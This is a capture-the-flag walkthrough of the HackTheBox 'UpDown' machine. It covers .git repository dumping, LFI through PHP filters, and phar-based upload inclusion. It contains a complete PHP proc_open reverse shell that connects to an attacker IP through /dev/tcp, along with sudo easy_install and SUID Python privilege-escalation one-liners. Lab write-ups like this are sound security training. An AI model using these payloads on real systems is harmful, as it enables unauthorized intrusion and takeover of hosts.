# HackTheBox - UpDown
**Youtube video:** https://youtu.be/aWq1d5ewfPg
---
## Initial Foothold

**Initial Testing:**
```bash
# Open website, see siteisup.htb
# First we try nc and type http://10.10.14.59 and see if we get any creds when they connect back to us
nc -lvnp 80
```

**Directory Enumeration:**
```bash
# Fuzz main site
ffuf -u http://siteisup.htb/FUZZ -w $raft -t 300 -fs 3142

# We open dev, we see it's empty, so we open burp
```

**Subdomain Enumeration:**
```bash
# Fuzz for vhosts
wfuzz -u http://$IP/ -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 93 -t 5
```

**Dev Directory Enumeration:**
```bash
# Fuzz /dev directory
ffuf -u http://siteisup.htb/dev/FUZZ -w $raft -t 300 -fs 3142
# Found: .git
```

---
## Git Repository Disclosure

**Download Git Repository:**
```bash
# Dump .git repository
sudo python3 /opt/web/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ ./gitfolder
```

**Analysis:**
```bash
# In .htaccess we see
# SetEnvIfNoCase Special-Dev "only4dev" Required-Header
# We include that in burp setting to add the header

# We see the update index.php and include .php file
# We notice that we can use ?page in the admin page with the new discovered vhost (dev.siteisup.htb)
# We notice include with page parameter
```

---
## Local File Inclusion (LFI)

**LFI via PHP Filter:**
```bash
# Read source code via base64 encoding
/?page=php://filter/convert.base64-encode/resource=index

# We notice as well, that with Page parameters there's an lfi code execution [unintended]
# You can try it with phpinfo through filter generator script
# https://github.com/synacktiv/php_filter_chain_generator
```

---
## File Upload + Phar Inclusion [Intended Method]

**Setup:**
```bash
# Second method [intended]
# We notice we can upload zip to
# We make a revshell.php
# Then we zip that
zip revshell.jpg revshell.php

# And to include it we type
phar://uploads/[fullpath]/revshell
```

**Test Command Execution:**
```bash
# We try echo, then we see it gets printed out in burp, then we should try php disabled functions
```

**Check PHP Configuration:**
```bash
# We change revshell.php to phpinfo
<?php phpinfo(); ?>

# Zip it again
zip revshell.jpg revshell.php

# We access the file again
phar://uploads/374988950d12fffcea9528a79d02004c/revshell.phar/revshell

# We check disabled functions
# https://github.com/strikoder/OffensiveSecurity/blob/main/misc/check_disabled_functions.php

# We see proc_open is enabled
```

**Bypass Disabled Functions with proc_open:**
```php
<?php
set_time_limit(0);
$ip = '10.10.14.X';
$port = 4444;
$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
$descriptorspec = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'w')
);
$process = proc_open($cmd, $descriptorspec, $pipes);
if (is_resource($process)) {
    proc_close($process);
}
?>
```

---
## Privilege Escalation

**Python SUID Script:**
```bash
# We see python script with suid, we can run it and type shell
__import__('os').system("bash")
```

**Easy_install GTFOBins:**
```bash
# We see we can run easy install, gtfobins
sudo -l

# GTFOBins easy_install privesc
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
